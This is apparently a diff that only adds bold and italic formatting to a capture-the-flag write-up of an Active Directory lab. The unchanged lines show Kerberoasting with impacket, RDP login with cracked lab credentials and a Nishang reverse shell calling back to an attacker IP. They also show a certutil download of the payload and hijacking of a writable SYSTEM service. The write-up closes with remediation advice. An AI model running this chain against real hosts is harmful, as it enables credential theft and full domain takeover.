@@ -182,7 +182,7 @@ Folders of interest:
 ### 10. PowerShell History Credential Leak
 
 Inside:  
-* LAB-ADMIN\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\**ConsoleHost_history.txt**
+* LAB-ADMIN\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
 
 Credentials found:  
 ```text
@@ -202,7 +202,7 @@ Result:
 ## External Credential Exposure (GitHub)
 ### 11. GitHub Credential Leak
 
-The web application on port 7990 references a GitHub repository related to the lab.
+The web application on **port 7990** references a GitHub repository related to the lab.
 
 Inside that repository:  
 ```text
@@ -247,7 +247,7 @@ contractor-temp:Password123!
 $ impacket-GetUserSPNs LAB.ENTERPRISE.THM/nik:'ToastyBoi!' -dc-ip 10.82.128.93 -request
 ```
 
-TGS hash captured for user bitbucket.
+TGS hash captured for user **bitbucket**.
 
 Cracked credentials:  
 ```text
@@ -276,7 +276,7 @@ Connect:
 $ xfreerdp3 /u:bitbucket /p:littleredbucket /v:10.82.128.93 /cert:ignore +clipboard /dynamic-resolution
 ```
 
-User flag found on Desktop:  
+**User flag** found on Desktop:  
 ```text
 THM{ed882d02b34246536ef7da79062bef36}
 ```
@@ -315,9 +315,9 @@ BloodHound collection:
 ```
 
 Critical finding:  
-* Service: ZeroTierOneService
-* Runs as: NT AUTHORITY\SYSTEM
-* Writable binary path
+* **Service**: ZeroTierOneService
+* **Runs as**: NT AUTHORITY\SYSTEM
+* **Writable binary path**
 
 Binary path:  
 ```text
@@ -328,14 +328,14 @@ C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe
 
 ### 17. Service Binary Hijacking
 
-Gonna use Nishang reverse shell (https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
+Gonna use **Nishang** reverse shell (https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
 
 Payload:  
 ```text
 Invoke-PowerShellTcp -Reverse -IPAddress 192.168.144.226 -Port 4444
 ```
 
-Converted (https://ps2exe.azurewebsites.net, do not use online converters in a real production) to executable (zro.exe) and uploaded:  
+Converted *(https://ps2exe.azurewebsites.net, do not use online converters in a real production)* to executable (zro.exe) and uploaded:  
 ```powershell
 > certutil -urlcache -split -f http://192.168.144.226/zro.exe zro.exe
 ```
@@ -365,29 +365,29 @@ THM{1a1fa94875421296331f145971ca4881}
 
 ## Security Failures & Vulnerability Classification
 Issue	Classification:  
-* Credentials exposed on GitHub	No CVE — Credential Exposure / OPSEC Failure
-* Sensitive files readable via SMB No CVE — Misconfiguration (CWE-522)
-* Kerberoastable SPN (bitbucket) No CVE — Kerberos Design Abuse
-* Writable SYSTEM service binary (ZeroTier)	No CVE — Windows Service Misconfiguration (CWE-284)
+* Credentials exposed on GitHub	**No CVE — Credential Exposure** / OPSEC Failure
+* Sensitive files readable via SMB **No CVE — Misconfiguration (CWE-522)**
+* Kerberoastable SPN (bitbucket) **No CVE — Kerberos Design Abuse**
+* Writable SYSTEM service binary (ZeroTier)	**No CVE — Windows Service Misconfiguration (CWE-284)**
 
 ---
 
 ## Remediation Recommendations
-* Enforce strict policies against publishing credentials online.
-* Audit all SMB shares for sensitive data.
-* Prohibit credential storage in plaintext (files, scripts, history).
-* Rotate all compromised passwords and enforce long, complex passwords or migrate to gMSA.
-* Apply Principle of Least Privilege to all service accounts and binaries — no writable SYSTEM services, ever.
+* **Enforce** strict policies against publishing credentials online.
+* **Audit** all SMB shares for sensitive data.
+* **Prohibit** credential storage in plaintext (files, scripts, history).
+* **Rotate** all compromised passwords and enforce long, complex passwords or migrate to gMSA.
+* **Apply** Principle of Least Privilege to all service accounts and binaries — no writable SYSTEM services, ever.
 
 ---
 
 ## Conclusion
 
-This lab perfectly illustrates how small operational mistakes, when chained together, can lead to full Active Directory takeover — even without exploiting a single critical CVE.
+This lab perfectly illustrates how small operational mistakes, when chained together, can lead to **full Active Directory takeover** — even **without exploiting a single critical CVE**.
 
 * No zero-days.
 * No magic exploits.
-* Just discipline failures.
+* Just **discipline failures**.
 
 ---
 
